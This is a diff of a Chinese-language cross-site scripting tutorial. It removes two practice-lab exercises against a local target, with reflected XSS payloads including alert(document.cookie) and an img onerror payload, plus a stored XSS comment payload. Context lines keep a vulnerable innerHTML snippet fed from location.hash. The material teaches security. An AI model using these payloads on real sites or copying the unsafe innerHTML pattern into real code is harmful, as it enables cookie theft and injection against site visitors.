@@ -49,29 +49,6 @@ http://example.com/search?q=<script>alert(1)</script>
 // 危险代码
 document.getElementById('result').innerHTML = location.hash.slice(1);
 ```
-
-## 🎯 靶场练习 3：反射型 XSS
-
-打开 `http://127.0.0.1:5000/xss/reflected`
-
-```html
-?name=<script>alert('XSS')</script>
-?name=<script>alert(document.cookie)</script>
-?name=<img src=x onerror=alert(1)>
-```
-
-## 🎯 靶场练习 4：存储型 XSS
-
-打开 `http://127.0.0.1:5000/xss/stored`
-
-在评论框输入：
-
-```html
-<script>alert('你被攻击了！')</script>
-```
-
-刷新页面，每次都会弹窗——所有访客都受影响。
-
 ## 💀 XSS 能做什么？
 
 ```javascript
